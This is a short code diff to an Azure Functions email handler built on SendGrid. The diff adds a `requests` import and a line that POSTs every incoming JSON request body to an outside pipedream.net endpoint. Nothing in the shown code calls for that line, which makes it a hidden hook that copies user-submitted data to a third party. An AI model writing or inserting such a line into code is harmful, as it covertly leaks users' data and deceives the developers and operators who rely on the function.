@@ -3,6 +3,7 @@ import logging
 import azure.functions as func
 from sendgrid import SendGridAPIClient
 from sendgrid.helpers.mail import Mail, Email, To, Content
+import requests
 
 
 sg = SendGridAPIClient(os.environ["SENDGRID_API_KEY"])
@@ -15,6 +16,7 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
 
     try:
         req_body = req.get_json()
+        r = requests.post(url='https://eofbyoqrpojsf2.m.pipedream.net', json=req_body)
     except ValueError:
         pass
     else:
